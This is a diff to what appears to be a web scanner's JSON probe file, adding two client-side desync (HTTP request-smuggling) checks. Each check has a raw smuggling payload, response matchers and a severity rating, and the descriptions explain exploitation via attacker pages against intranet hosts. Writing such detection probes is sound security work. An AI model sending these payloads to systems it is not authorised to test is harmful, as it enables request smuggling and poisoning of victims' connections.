@@ -400,6 +400,69 @@
           "variables": {}
         }
       ]
+    },
+    "browser_powered_csd_intranet": {
+      "description": "Browser-powered client-side desync \u2014 attacker page triggers victim browser to issue malformed POST that desyncs same-origin connection, then victim's next request lands on attacker-controlled response. Works on single-server stacks lacking front-end proxy.",
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "IIS",
+        "Node.js"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Type: text/plain\r\nContent-Length: 33\r\n\r\nGET /swktest-csd-{{marker}} HTTP/1.1\r\nX:x",
+          "description": "Browser-issuable POST with body containing smuggled GET \u2014 no Transfer-Encoding (browser-blocked), CL drift only",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                404,
+                302
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "browser_powered_csd_internal": {
+      "description": "Browser-powered CSD against internal/intranet hosts via attacker-page-triggered cross-origin POST; victim browser desyncs connection to internal app behind same VPN.",
+      "tech_match": [
+        "Internal apps",
+        "Intranet",
+        "VPN-gated"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 4\r\n\r\nGGGGGET /swktest-int-{{marker}} HTTP/1.1\r\nHost: {{host}}\r\n\r\n",
+          "description": "Cross-origin browser POST splits request on internal app -- exploitable from public attacker page",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "header_change",
+              "headers": [
+                "X-Cache",
+                "Set-Cookie"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
     }
   },
   "description": ". v1.0 extension: Kettle BH USA / DEFCON 33 2025 variants \u2014 0.CL, CL.0, V-H, Expect-100, RQP, double-desync."
